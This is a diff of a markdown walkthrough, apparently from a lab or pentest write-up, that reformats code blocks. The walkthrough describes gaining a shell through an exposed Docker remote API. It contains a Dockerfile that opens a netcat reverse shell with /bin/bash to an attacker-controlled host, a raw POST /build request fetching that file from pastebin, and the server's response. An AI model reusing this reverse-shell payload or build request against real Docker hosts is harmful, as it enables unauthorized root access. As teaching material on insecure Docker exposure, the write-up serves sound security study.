@@ -37,13 +37,13 @@ After some quick reading through the [Docker API Documentation](https://docs.doc
 Since Docker allows us to create an image from a _Dockerfile_, it shouldn't be too different if performed through the API, right?
 We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container.
 
-`FROM ubuntu:16.04
+```FROM ubuntu:16.04
 RUN apt-get update -y && apt-get install netcat -y
-CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]`
+CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]```
 
 Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.
 
-`POST /build?remote=https://pastebin.com/raw/twq0c1M4 HTTP/1.1
+```POST /build?remote=https://pastebin.com/raw/twq0c1M4 HTTP/1.1
 Host: 10.0.5.10:4000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -54,17 +54,17 @@ Upgrade-Insecure-Requests: 1
 Content-Type: application/json
 Content-Length: 2
 
-{}`
+{}```
 
 The reponse came confirming the creation of the image successfully
-`HTTP/1.1 201 Created
+```HTTP/1.1 201 Created
 Server: nginx/1.10.3 (Ubuntu)
 Date: Tue, 03 Oct, 2017 15:52:16 GMT
 Content-Type: application/json
 Content-Length: 90
 Connection: Close
 
-{"Id":"89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d","Warnings":null}`
+{"Id":"89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d","Warnings":null}```
 
 We can confirm that our image has been created by going to this URL: http://10.0.5.10:4000/images/json. It should be the first one form the top.
 
